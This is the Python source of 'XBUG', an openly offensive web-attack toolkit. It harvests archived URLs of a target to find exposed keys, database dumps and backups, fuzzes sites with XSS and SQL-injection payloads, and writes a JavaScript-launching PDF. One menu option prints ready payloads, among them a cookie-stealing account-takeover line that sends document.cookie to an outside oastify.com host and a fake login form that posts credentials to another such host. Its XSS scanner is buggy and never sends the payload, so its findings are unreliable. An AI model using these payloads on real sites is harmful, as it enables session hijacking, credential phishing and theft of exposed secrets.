import os
import colorama
import time
import requests
from colorama import Fore
import webbrowser
from urllib.parse import urlparse

os.system('cls' if os.name == 'nt' else 'clear')

colorama.init(autoreset=True)

def load_payloads_xss(file_path):
    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8') as file:
            return [line.strip() for line in file if line.strip()]
    return []

payloads_folder = "Payloads"
xss_payloads_file = os.path.join(payloads_folder, "xss.txt")

xss_payloads = load_payloads_xss(xss_payloads_file)

def load_payloads_sqli(file_path):
    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8') as file:
            return [line.strip() for line in file if line.strip()]
    return []

payloads_folder_sql = "Payloads/Sqli"
sql_payloads_file = os.path.join(payloads_folder, "xor.txt")

sql_payloads = load_payloads_xss(sql_payloads_file)

def payload_scan_xss(url):
    for payload in xss_payloads:
        url_payload_scanner_xss = f"{url}{payload}"
        response = requests.get(url)
        if payload in response.text:
            print(f"{Fore.GREEN}[+] XSS Vulnerability Found at: {url_payload_scanner_xss}")
        else:
            print(f"{Fore.RED}[-] No XSS at: {url_payload_scanner_xss}")

def payload_scan_sql(url):
    for payload in sql_payloads:
        url_payload_scanner_sql = f"{url}{payload}"
        response = requests.get(url_payload_scanner_sql)
        if "sql" in response.text.lower() or "syntax" in response.text.lower():
            print(f"{Fore.GREEN}[+] SQL Injection Vulnerability Found at: {url_payload_scanner_sql}")
        else:
            print(f"{Fore.RED}[-] No SQL Injection at: {url_payload_scanner_sql}")

def url_scanner_checker(url, valid_file, invalid_file):
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            print(f"{Fore.GREEN}200 - {url}{Fore.WHITE}")
            with open(valid_file, "a") as v_file:
                v_file.write(url + "\n")
        elif response.status_code == 404:
            print(f"{Fore.RED}404 - {url}{Fore.WHITE}")
            with open(invalid_file, "a") as i_file:
                i_file.write(url + "\n")
        else:
            print(f"{Fore.YELLOW}{response.status_code} - {url}{Fore.WHITE}")
            with open(invalid_file, "a") as i_file:
                i_file.write(url + "\n")
    except requests.RequestException:
        print(f"{Fore.RED}Invalid URL - {url}{Fore.WHITE}")
        with open(invalid_file, "a") as i_file:
            i_file.write(url + "\n")

main_screen = rf"""
{Fore.RED}██╗  ██╗{Fore.BLUE}██████╗ ██╗   ██╗ ██████╗
{Fore.RED}╚██╗██╔╝{Fore.BLUE}██╔══██╗██║   ██║██╔════╝ 
{Fore.RED} ╚███╔╝ {Fore.BLUE}██████╔╝██║   ██║██║  ███╗  {Fore.WHITE}Version = {Fore.GREEN}1.4{Fore.WHITE}
{Fore.RED} ██╔██╗ {Fore.BLUE}██╔══██╗██║   ██║██║   ██║  {Fore.WHITE}Lastest Version: {Fore.GREEN}True{Fore.WHITE}
{Fore.RED}██╔╝ ██╗{Fore.BLUE}██████╔╝╚██████╔╝╚██████╔╝
{Fore.RED}╚═╝  ╚═╝{Fore.BLUE}╚═════╝  ╚═════╝  ╚═════╝ 

{Fore.WHITE}Developed By: {Fore.RED}Z3RO {Fore.BLUE}Discord: {Fore.GREEN}@313top{Fore.WHITE}
{Fore.WHITE}Press 1 to go to main menu
"""

print(main_screen)
main_load = input("</#root\> ")

if main_load == "1":
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        main_menu_screen = rf"""
        {Fore.RED}██╗  ██╗{Fore.BLUE}██████╗ ██╗   ██╗ ██████╗
        {Fore.RED}╚██╗██╔╝{Fore.BLUE}██╔══██╗██║   ██║██╔════╝ 
        {Fore.RED} ╚███╔╝ {Fore.BLUE}██████╔╝██║   ██║██║  ███╗  {Fore.WHITE}Version = {Fore.GREEN}1.4
        {Fore.RED} ██╔██╗ {Fore.BLUE}██╔══██╗██║   ██║██║   ██║  {Fore.WHITE}Lastest Version: {Fore.GREEN}True
        {Fore.RED}██╔╝ ██╗{Fore.BLUE}██████╔╝╚██████╔╝╚██████╔╝
        {Fore.RED}╚═╝  ╚═╝{Fore.BLUE}╚═════╝  ╚═════╝  ╚═════╝ 

        {Fore.WHITE}Developed By: {Fore.RED}Z3RO {Fore.BLUE}Discord: {Fore.GREEN}@313top{Fore.WHITE}
        {Fore.WHITE}More Coming Soon!

        [{Fore.RED}0{Fore.BLUE}1{Fore.WHITE}] Access {Fore.RED}404{Fore.WHITE} files of any server
        [{Fore.RED}0{Fore.BLUE}2{Fore.WHITE}] {Fore.YELLOW}JavaScript {Fore.WHITE}Recon Masterclass {Fore.RED}( Hard To Use # Static ){Fore.WHITE}
        [{Fore.RED}0{Fore.BLUE}3{Fore.WHITE}] {Fore.RED}WayBackArchive {Fore.YELLOW}Instant{Fore.WHITE}
        [{Fore.RED}0{Fore.BLUE}4{Fore.WHITE}] {Fore.GREEN}Blind XSS {Fore.WHITE}Full {Fore.RED}Account{Fore.WHITE} TakeOver {Fore.RED}( Tutorial ){Fore.WHITE}
        [{Fore.RED}0{Fore.BLUE}5{Fore.WHITE}] {Fore.YELLOW}PDF {Fore.WHITE}Stored {Fore.GREEN}XSS{Fore.WHITE}
        [{Fore.RED}0{Fore.BLUE}6{Fore.WHITE}] {Fore.WHITE}URL {Fore.RED}Scanner{Fore.WHITE}
        [{Fore.RED}0{Fore.BLUE}7{Fore.WHITE}] {Fore.GREEN}XSS {Fore.YELLOW}Payload {Fore.WHITE}Scanner{Fore.WHITE}
        [{Fore.RED}0{Fore.BLUE}8{Fore.WHITE}] {Fore.BLUE}SQLi {Fore.YELLOW}Payload {Fore.WHITE}Scanner{Fore.WHITE}
        [{Fore.RED}0{Fore.BLUE}9{Fore.WHITE}] {Fore.WHITE}URL {Fore.RED}Downloader{Fore.WHITE}
        """
        print(main_menu_screen)
        main_menu_screen_choice = input("</#root\> ")

        if main_menu_screen_choice == "1":
            print(f"{Fore.RED}WARNING: MAKE SURE TO BE IN KALI LINUX OR UBUNTU!!!")
            print(f"Please wait 3 seconds{Fore.RED}...") 
            time.sleep(3)
            print(f"Example: policybazaar.com {Fore.RED}( ONLY! )")
            print(f"{Fore.YELLOW}File Will Be Saved in Output.txt")
            website_target = input("Website ( Target ): ")
            os.system("touch output.txt")
            os.system("truncate -s 0 output.txt")
            os.system(f'curl -G "https://web.archive.org/cdx/search/cdx" --data-urlencode "url=*.{website_target}/*" --data-urlencode "collapse=urlkey" --data-urlencode "output=text" --data-urlencode "fl=original" > output.txt')
            os.system("du -h output.txt")
            print(f"{Fore.GREEN}Finished Downloading Links Now Getting Juicy Important Files...") 
            print(f"Please Wait 5 seconds{Fore.RED}...")
            time.sleep(5)
            os.system('cls' if os.name == 'nt' else 'clear')
            os.system("cat output.txt | grep -E '\\.xls|\\.xml|\\.xlsx|\\.json|\\.pdf|\\.sql|\\.doc|\\.docx|\\.pptx|\\.txt|\\.zip|\\.tar\\.gz|\\.tgz|\\.bak|\\.7z|\\.rar|\\.log|\\.cache|\\.secret|\\.db|\\.backup|\\.yml|\\.gz|\\.config|\\.csv|\\.yaml|\\.md|\\.md5|\\.exe|\\.dll|\\.bin|\\.ini|\\.bat|\\.sh|\\.tar|\\.deb|\\.rpm|\\.iso|\\.img|\\.apk|\\.msi|\\.dmg|\\.tmp|\\.crt|\\.pem|\\.key|\\.pub|\\.asc'")
            input(f"{Fore.BLUE}Press Enter to go back{Fore.RED}...")
            os.system('cls' if os.name == 'nt' else 'clear')

        elif main_menu_screen_choice == "2":
            print(f"{Fore.RED}WARNING: MAKE SURE TO BE IN KALI LINUX OR UBUNTU!!!")
            print(f"{Fore.RED}WARNING: Watch this video before using it")
            print(f"{Fore.RED}https://www.youtube.com/watch?v=FWPXWBh4EFw&t ( Will Help 100% )")
            print(f"Please wait 3 seconds{Fore.RED}...")
            time.sleep(3)
            website_target = input("Website ( Target ): ")
            os.system(f'katana -u {website_target} -d 5 -jc | grep ‘\.js$’ | tee alljs.txt')
            os.system('echo www.samsung.com | gau | grep .js | anew alljs.txt')
            os.system('cat alljs.txt | httpx-toolkit -mc 200 -o samsung.txt')
            os.system('cat samsung.txt | jsleaks -s -l -k')
            os.system('cat samsung.txt | nuclei -t prsnl/credentials-disclosure-all.yaml -c 30')
            os.system('cat samsung.txt | nuclei -t /home/YOURFILEDEC/nuclei-templates/http/exposures -c 30')
            os.system('cat samsung.txt | xargs -I{} bash -c ‘echo -e “\ntarget : {}\n” && python Files/lazyegg.py “{}” — js_urls — domains — ips — leaked_creds — local_storage’')
            os.system('cls' if os.name == 'nt' else 'clear')
            input(f"{Fore.BLUE}Press Enter to go back{Fore.RED}...")
            os.system('cls' if os.name == 'nt' else 'clear')

        elif main_menu_screen_choice == "3":
            print(f"Please wait 2 seconds{Fore.RED}...")
            time.sleep(2)
            website_target = input("Website ( Target ): ")
            url = f"https://web.archive.org/web/*/{website_target}"
            time.sleep(2)
            webbrowser.open(url)
            os.system('cls' if os.name == 'nt' else 'clear')
            input(f"{Fore.BLUE}Press Enter to go back{Fore.RED}...")
            os.system('cls' if os.name == 'nt' else 'clear')

        elif main_menu_screen_choice == "4":
            print(""" 
            HTMLi:
            <font color="red">ERROR 1064 (42000): You have an error in your SQL syntax;

            RXSS:
            <img src/onerror=prompt(document.cookie)>

            IFrame:
            "><iframe src="https://www.cia.gov/" style="border: 0; position:fixed; top:0; left:0; right:0; bottom:0; width:100%; height:100%">

            ATO:
            <img src=x  onerror="document.location='http://o0p70yehe4avf6728g095671asgj49sy.oastify.com?c='+document.cookie;" />

            PHISHING:
            <h3>Please login to proceed</h3> <form action=http://zgj49ubrlvka5wgrek9bc0eryi49s0io7.oastify.com>
            Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br>
            <input type="submit" value="Login"></br>

            For Account Takeover Great Website: https://xss.report/dashboard
            """)
            input(f"{Fore.BLUE}Press Enter to go back{Fore.RED}...")
            os.system('cls' if os.name == 'nt' else 'clear')

        elif main_menu_screen_choice == "5":
            pdf_say = input("What do you want pdf to say: ")
            pdf_code = f"""%PDF-1.7
        1 0 obj
        << /Pages 1 0 R /OpenAction 2 0 R >>
        2 0 obj
        << /S /JavaScript /JS (app.alert("{pdf_say}")) >>
        trailer << /Root 1 0 R >>
            """
    
            with open("pdf_xss.pdf", "w") as pdf_file:
                pdf_file.write(pdf_code)
            input(f"{Fore.BLUE}Press Enter to go back{Fore.RED}...")
            os.system('cls' if os.name == 'nt' else 'clear')

        elif main_menu_screen_choice == "6":
            print("Example: urls.txt ( make sure it exits )")
            file_txt_checker = input("txt file: ")
            if not os.path.exists(file_txt_checker):
                print(f"{Fore.RED}Error: File not found!{Fore.WHITE}")
                continue
            
            valid_file = file_txt_checker.replace(".txt", "_valid.txt")
            invalid_file = file_txt_checker.replace(".txt", "_invalid.txt")

            with open(file_txt_checker, "r") as file:
                urls = file.read().splitlines()

            for url in urls:
                url_scanner_checker(url, valid_file, invalid_file)

            input(f"{Fore.BLUE}Press Enter to go back{Fore.RED}...")
            os.system('cls' if os.name == 'nt' else 'clear')

        elif main_menu_screen_choice == "7":
            print("with parameter (http://site.com/index.php?id=):")
            website_target_xss = input("Website: ")
            payload_scan_xss(website_target_xss)
            input(f"{Fore.BLUE}Press Enter to go back{Fore.RED}...")
            os.system('cls' if os.name == 'nt' else 'clear')

        elif main_menu_screen_choice == "8":
            print("with parameter (http://site.com/index.php?id=):")
            website_target_sql = input("Website: ")
            payload_scan_sql(website_target_sql)
            input(f"{Fore.BLUE}Press Enter to go back{Fore.RED}...")
            os.system('cls' if os.name == 'nt' else 'clear')

        elif main_menu_screen_choice == "9":
            downloader = input("URLs txt file: ").strip()
    
            if not os.path.exists(downloader):
                print(f"{Fore.RED}Error: File not found!{Fore.WHITE}")
                input(f"{Fore.BLUE}Press Enter to go back{Fore.RED}...")
                continue

            os.makedirs("Downloads", exist_ok=True)

            with open(downloader, "r", encoding="utf-8") as file:
                urls = file.read().splitlines()

            for url in urls:
                try:
                    response = requests.get(url, stream=True, timeout=10)
                    if response.status_code == 200:
                        filename = os.path.join("Downloads", os.path.basename(urlparse(url).path) or "downloaded_file")
                        with open(filename, "wb") as f:
                            for chunk in response.iter_content(chunk_size=1024):
                                f.write(chunk)
                        print(f"{Fore.GREEN}Downloaded: {filename}{Fore.WHITE}")
                    else:
                        print(f"{Fore.YELLOW}Failed: {url} (Status: {response.status_code}){Fore.WHITE}")
                except requests.RequestException as e:
                    print(f"{Fore.RED}Error downloading: {url} ({str(e)}){Fore.WHITE}")

            input(f"{Fore.BLUE}Press Enter to go back{Fore.RED}...")
            os.system('cls' if os.name == 'nt' else 'clear')
